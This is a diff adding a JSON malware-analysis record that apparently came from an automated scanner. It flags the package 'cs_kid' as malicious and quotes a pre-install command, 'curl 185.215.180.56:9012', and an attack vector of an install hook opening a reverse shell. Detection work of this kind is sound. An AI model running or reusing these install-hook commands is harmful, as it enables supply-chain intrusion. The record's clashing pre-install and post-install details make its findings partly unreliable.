@@ -1,0 +1,54 @@
+{
+  "package_name": "cs_kid",
+  "version": "2.1.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "network_exfiltration"
+    ],
+    "behaviors": [
+      {
+        "category": "network_exfiltration",
+        "summary": "The package contains a hardcoded external IP address '185.215.180.56' in the pre-install script.",
+        "details": "The hardcoded external IP address '185.215.180.56' in the pre-install script of the package points to a network exfiltration risk.",
+        "confidence": 0.97,
+        "evidence_apis": [],
+        "evidence_files": [],
+        "evidence_domains": [],
+        "evidence_commands": [
+          "curl 185.215.180.56:9012"
+        ],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "This JSON object represents the analysis of the package. The package contains a network exfiltration risk due to the hardcoded external IP address '185.215.180.56' in the pre-install script. The risk is high (confidence score of 0.97). The evidence of this risk comes from the command \"curl 185.215.180.56:9012\" in the pre-install script."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package 'cs_kid' contains a network exfiltration risk due to the hardcoded external IP address '185.215.180.56' in the pre-install script. The risk is likely due to the command 'curl 185.215.180.56:9012' in the pre-install script.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash-c",
+        "34.x.x.x:4444",
+        "reverseshell"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.97
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": ""
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.9693,
+    "confirmed_signals_count": 2,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:16:19.089043"
+}
